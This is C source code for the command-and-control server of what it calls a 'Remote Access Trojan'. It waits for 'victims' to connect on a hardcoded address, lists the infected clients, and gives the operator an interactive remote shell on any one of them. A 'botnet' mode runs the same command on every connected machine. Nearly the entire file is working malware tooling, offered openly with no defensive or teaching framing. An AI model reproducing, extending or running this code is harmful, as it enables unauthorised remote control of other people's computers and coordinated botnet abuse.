#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#include <stdlib.h>

int inMenu = 1;
int inShell = 0;
int inBShell = 0;

int socket_count = 0;

struct client
{
	int id;
	int socketfd;
	struct sockaddr_in client_sockaddr;
};

struct client all_clients[10];

void print_banner()
{
	printf("=====================\n");
	printf(" ____      _  _____ \n");
	printf("|  _ \\    / \\|_   _|\n");
	printf("| |_) |  / _ \\ | |  \n");
	printf("|  _ <  / ___ \\| |  \n");
	printf("|_| \\_\\/_/   \\_\\_|  \n");
	printf("\n");
	printf("Remote Access Trojan\n");
	printf("ver. 1.0\n");
	printf("=====================\n");
	printf("\n");
	printf("Waiting for a victim to connect..\n");
	return;
}

int menu()
{
	print_banner();
	printf("Type 'help' to show all commands.\n\n");
	inMenu = 1;
	inShell = 0;
	inBShell = 0;
	int selectedValue;

	char command[512];

	while(inMenu)
	{	printf("[RAT - menu]> ");
		bzero(&command, sizeof(command));

		fgets(command, sizeof(command), stdin);
		strtok(command, "\n");
		if(strncmp("help", command, sizeof("help")) == 0)
		{
			printf("\n\tCommands:\n");
			printf("in MENU:\n");
			printf("\tquit - disconnect all clients\n");
			printf("\tclients - show all connected clients\n");
			printf("\tshell - get a remote shell on any client\n");
			printf("\tbotnet - activates botnet mode (shell which executes commands on all clients)\n\n");
			printf("in SHELL:\n");
			printf("\tq - disconnect client from server\n");
			printf("\tbg - background client\n\n");
			printf("in BotnetSHELL:\n");
			printf("\tshowOutput - toggles output(if on, slower)\n");
			printf("\tq - disconnect all clients\n");
			printf("\tbg - background all clients\n\n");
		}
		else if(strncmp("clients", command, sizeof("clients")) == 0)
		{
			printf("\n\n\t\tConnected clients: %d\n", socket_count - 1);
			printf("---------------------------------------------------------\n");
			printf("|\tID\t|\tIP address\t|\t Port\t|\n");
			printf("---------------------------------------------------------\n");
			for(int i = 1; i < socket_count; ++i)
			{
				printf("|\t%d\t|\t%s\t|\t%d\t|\n", i, inet_ntoa(all_clients[i].client_sockaddr.sin_addr), ntohs(all_clients[i].client_sockaddr.sin_port));
				printf("---------------------------------------------------------\n");
			}
		}
		else if(strncmp("shell", command, sizeof("shell")) == 0)
		{
			printf("Type client ID\n");
			printf("[ID]> ");
			bzero(&selectedValue, sizeof(selectedValue));
			scanf("%d", &selectedValue);
			if(selectedValue > socket_count - 1 && selectedValue > 1)
			{
				printf("Invalid client ID. Use 'clients' command to show all client IDs.\n");
			}
			else
			{
				if(shell(all_clients[selectedValue].socketfd, all_clients[selectedValue].client_sockaddr) == 0)
				{
					printf("\tClient [%d] has been backgrounded.\n", selectedValue);
				}
			}
		}
		else if(strncmp("quit", command, sizeof("quit")) == 0)
		{
			for(int i = 1; i < socket_count; i++)
			{
				write(all_clients[i].socketfd, "q", sizeof("q"));
				printf("\tClient [%d] has been disconnected.\n", i);
			}
			printf("All clients have been disconnected");
		}
		else if(strncmp("botnet", command, sizeof("botnet")) == 0)
		{
			botnet_shell();
		}
		else if(command[1] == NULL)
		{
			// NOTHING
		}
		else
		{
			printf("Invalid syntax. Type 'help' to show all commands.\n");
		}
	}
	return 0;
}
int botnet_shell()
{
	inShell = 0;
	inMenu = 0;
	inBShell = 1;
	int botnet_active = 1;
	int show_output = 0;
	while(botnet_active)
	{
		char buffer[1024];
		char response[18384];
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("[BOTNET]> ");
		fgets(buffer, sizeof(buffer), stdin); // read input and save it into buffer
		strtok(buffer, "\n"); // remove \n from the inputed string -- ex.: dir\n -> dir
		if(strncmp("showOutput", buffer, sizeof("showOutput")) == 0)
		{
			if(show_output == 0)
			{
				printf("Show output - on\n");
				show_output = 1;
			}
			else
			{
				printf("Show output - off\n");
				show_output = 0;
			}
		}
		else if(strncmp("q", buffer, sizeof("q")) == 0)
		{
			for(int i = 1; i < socket_count; i++)
			{
				write(all_clients[i].socketfd, "q", sizeof("q"));
				printf("\tClient [%d] has been disconnected.\n", i);
			}
			printf("All clients have been disconnected\n");
		}
		else if(strncmp("bg", buffer, sizeof("bg")) == 0)
		{
			inShell = 0;
			inMenu = 1;
			inBShell = 0;
			botnet_active = 0;
			break;
		}
		else
		{
			for(int i = 1; i < socket_count; i++)
			{
				write(all_clients[i].socketfd, buffer, sizeof(buffer));
				if(show_output == 0)
				{
					recv(all_clients[i].socketfd, response, sizeof(response), MSG_WAITALL);
					printf("[<%s>:%d]> %s\n", inet_ntoa(all_clients[i].client_sockaddr.sin_addr), ntohs(all_clients[i].client_sockaddr.sin_port), response);
				}
				else
				{

				}
			}
		}
	}
	return 0;
}

int shell(int client_socket, struct sockaddr_in client_sockaddr)
{
	inShell = 1;
	inMenu = 0;
	inBShell = 0;
	int active = 1;
	while(active == 1)
	{
		char buffer[1024];
		char response[18384];
		jump:
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("* Shell#%s~$: ", inet_ntoa(client_sockaddr.sin_addr));
		fgets(buffer, sizeof(buffer), stdin); // read input and save it into buffer
		strtok(buffer, "\n"); // remove \n from the inputed string -- ex.: dir\n -> dir
		write(client_socket, buffer, sizeof(buffer));
		if(strncmp("q", buffer, 1) == 0)
		{
			printf("Exit.");
			active == 0;
			break;
		}
		else if(strncmp("bg", buffer, 2)== 0)
		{
			inShell = 0;
			inMenu = 1;
			inBShell = 0;
			active = 0;
			break;
		}
		else if(strncmp("cd ", buffer, 3) == 0)
		{
			goto jump;
		}
		else
		{
			recv(client_socket, response, sizeof(response), MSG_WAITALL); // wait until full request is satisfiedMSG_WAITALL)
			printf("%s", response);
		}
	}

	return 0;
}
void *connection_handler()
{
	int client_sockets[10];
	int sock, client_socket;
	struct sockaddr_in server_address, client_address;
	int i=0;
	int optval = 1;
	socklen_t client_length;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
	{
		printf("Error Setting TCP Socket Options!\n");
	}

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("192.168.189.140");
	server_address.sin_port = htons(42505);

	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
	listen(sock, 5);
	client_length = sizeof(all_clients[socket_count].client_sockaddr);

	while(1)
	{
		socket_count++;
		all_clients[socket_count].socketfd = accept(sock, (struct sockaddr *) &all_clients[socket_count].client_sockaddr, &client_length);
		printf("\n\n\tCONNECTION RECEIVED\n\t[IP]\t%s\n\t[PORT]\t%d\n\n\n", inet_ntoa(all_clients[socket_count].client_sockaddr.sin_addr), ntohs(all_clients[socket_count].client_sockaddr.sin_port));
	}
}

int main()
{
	pthread_t thread_connection_handler_id;
	pthread_create(&thread_connection_handler_id, NULL, connection_handler, NULL);
	//pthread_join(thread_connection_handler_id, NULL);
	menu();
}
